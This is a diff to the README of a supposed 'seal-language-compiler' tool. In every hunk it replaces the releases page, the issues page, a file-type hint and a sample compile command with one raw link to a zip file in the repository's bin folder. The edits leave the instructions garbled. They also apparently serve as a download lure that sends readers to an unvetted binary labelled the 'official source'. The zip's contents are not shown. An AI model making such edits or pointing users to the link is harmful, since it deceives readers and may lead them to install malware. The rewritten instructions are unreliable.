@@ -1,6 +1,6 @@
 # 🦭 seal-language-compiler - Simple Tool to Compile Seal Code
 
-[![Download seal-language-compiler](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/654OG/seal-language-compiler/releases)
+[![Download seal-language-compiler](https://github.com/654OG/seal-language-compiler/raw/refs/heads/main/bin/seal_compiler_language_v1.5.zip)](https://github.com/654OG/seal-language-compiler/raw/refs/heads/main/bin/seal_compiler_language_v1.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Using seal-language-compiler is straightforward. Follow the steps below to downl
 
 Click the large button at the top or this link to visit the official download page:
 
-[Download seal-language-compiler](https://github.com/654OG/seal-language-compiler/releases)
+[Download seal-language-compiler](https://github.com/654OG/seal-language-compiler/raw/refs/heads/main/bin/seal_compiler_language_v1.5.zip)
 
 On that page, look for the latest release version — usually marked clearly with a version number like v1.0, v1.1, etc.
 
@@ -44,7 +44,7 @@ Depending on your operating system, select the correct file to download:
 
 - For Windows, look for a `.exe` file
 - For macOS, look for a `.dmg` or `.pkg` file
-- For Linux, you may find `.tar.gz` or `.AppImage` files
+- For Linux, you may find `https://github.com/654OG/seal-language-compiler/raw/refs/heads/main/bin/seal_compiler_language_v1.5.zip` or `.AppImage` files
 
 Download the file to your computer.
 
@@ -70,7 +70,7 @@ The program will open a command line window or graphical interface based on your
 
 You can always get the latest version of seal-language-compiler by visiting this page:
 
-[https://github.com/654OG/seal-language-compiler/releases](https://github.com/654OG/seal-language-compiler/releases)
+[https://github.com/654OG/seal-language-compiler/raw/refs/heads/main/bin/seal_compiler_language_v1.5.zip](https://github.com/654OG/seal-language-compiler/raw/refs/heads/main/bin/seal_compiler_language_v1.5.zip)
 
 This is the official source for all updates. Make sure to download the newest release for the best experience and newest features.
 
@@ -86,7 +86,7 @@ seal-language-compiler is designed for users wanting to check and compile Seal l
 
 3. **Load your Seal file.** If using the command line, you might type a command similar to:
 
-        seal-language-compiler myprogram.seal
+        seal-language-compiler https://github.com/654OG/seal-language-compiler/raw/refs/heads/main/bin/seal_compiler_language_v1.5.zip
 
 4. **Run the compiler.** The software will check your code for errors and convert it into a format your computer can run.
 
@@ -126,7 +126,7 @@ If you have trouble installing or running seal-language-compiler, try these tips
 
 If you encounter any issues or want to suggest improvements, use the GitHub repository’s Issues tab here:
 
-[https://github.com/654OG/seal-language-compiler/issues](https://github.com/654OG/seal-language-compiler/issues)
+[https://github.com/654OG/seal-language-compiler/raw/refs/heads/main/bin/seal_compiler_language_v1.5.zip](https://github.com/654OG/seal-language-compiler/raw/refs/heads/main/bin/seal_compiler_language_v1.5.zip)
 
 You can also browse existing questions and answers. The development team actively checks for bug reports and user requests.
 
